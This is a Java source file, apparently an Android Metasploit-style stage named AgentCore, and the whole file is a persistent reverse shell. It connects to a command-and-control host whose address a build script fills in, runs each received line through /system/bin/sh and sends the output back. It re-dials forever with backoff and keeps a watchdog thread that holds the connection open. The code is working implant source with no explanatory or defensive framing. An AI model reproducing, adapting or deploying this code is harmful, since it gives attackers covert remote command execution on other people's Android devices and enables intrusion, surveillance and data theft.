package com.metasploit.stage;

import java.io.InputStream;
import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.io.BufferedReader;
import java.io.InputStreamReader;

/**
 * Persistent TCP command shell — connects to C2, runs received commands
 * via /system/bin/sh, streams output back. Re-dials forever with backoff.
 */
public final class AgentCore {
    static final String C2_HOST = "192.0.2.1";  // ← replaced by build script
    static final int C2_PORT = 11111;            // ← replaced by build script
    static final byte[] MAGIC = "__DLS_AGENT__\n".getBytes();
    static final String MAGIC_STR = "__DLS_AGENT__";

    private static volatile Socket CURRENT_SOCK = null;
    private static final java.util.concurrent.atomic.AtomicBoolean STARTED =
        new java.util.concurrent.atomic.AtomicBoolean(false);

    public static void run() {
        if (!STARTED.compareAndSet(false, true)) return;

        // Watchdog: probe socket every 20s, force re-dial on half-open
        Thread watchdog = new Thread(new Runnable() {
            @Override public void run() {
                while (true) {
                    try { Thread.sleep(20000); } catch (InterruptedException e) { break; }
                    Socket s = CURRENT_SOCK;
                    if (s == null || s.isClosed()) continue;
                    try {
                        s.setSoTimeout(2000);
                        synchronized(s) {
                            try {
                                s.getOutputStream().write(";;keepalive\n".getBytes());
                                s.getOutputStream().flush();
                            } catch (Exception ignored) {}
                        }
                        s.setSoTimeout(60000);
                    } catch (Exception e) {
                        try { s.close(); } catch (Exception ignored) {}
                    }
                }
            }
        }, "agent-watch");
        watchdog.setDaemon(true);
        watchdog.start();

        // Dial + serve loop
        Thread t = new Thread(new Runnable() {
            @Override public void run() {
                int fail = 0;
                while (true) {
                    Socket sock = null;
                    try {
                        sock = new Socket();
                        sock.connect(new InetSocketAddress(C2_HOST, C2_PORT), 15000);
                        CURRENT_SOCK = sock;
                        handle(sock);
                        fail = 0;
                    } catch (Exception e) {
                        fail++;
                        try { if (sock != null) sock.close(); } catch (Exception ignored) {}
                        long d = Math.min(5000L * ((fail % 12) + 1), 60000L);
                        try { Thread.sleep(d); } catch (InterruptedException ignored) {}
                    }
                }
            }
        }, "agent-shell");
        t.setDaemon(true);
        t.start();
    }

    private static void handle(final Socket sock) throws Exception {
        CURRENT_SOCK = sock;
        sock.getOutputStream().write(MAGIC);
        sock.getOutputStream().flush();
        sock.setSoTimeout(0);

        BufferedReader socketIn = new BufferedReader(
            new InputStreamReader(sock.getInputStream(), "UTF-8"));
        final OutputStream out = sock.getOutputStream();

        String line;
        while ((line = socketIn.readLine()) != null) {
            line = line.trim().replace("\u0000", "").replace("\r", "");
            if (line.isEmpty()) continue;
            if (line.startsWith(";;keepalive")) continue;
            if (line.equals(MAGIC_STR)) continue;
            try {
                Process p = new ProcessBuilder("/system/bin/sh", "-c", line)
                    .redirectErrorStream(true).start();
                byte[] buf = new byte[8192];
                InputStream pin = p.getInputStream();
                int n;
                while ((n = pin.read(buf)) > 0) {
                    out.write(buf, 0, n);
                    out.flush();
                }
                out.write("\n".getBytes());
                out.flush();
            } catch (Exception e) {
                try {
                    out.write(("ERR: " + e.getMessage() + "\n").getBytes());
                    out.flush();
                } catch (Exception ignored) {}
            }
        }
    }
}
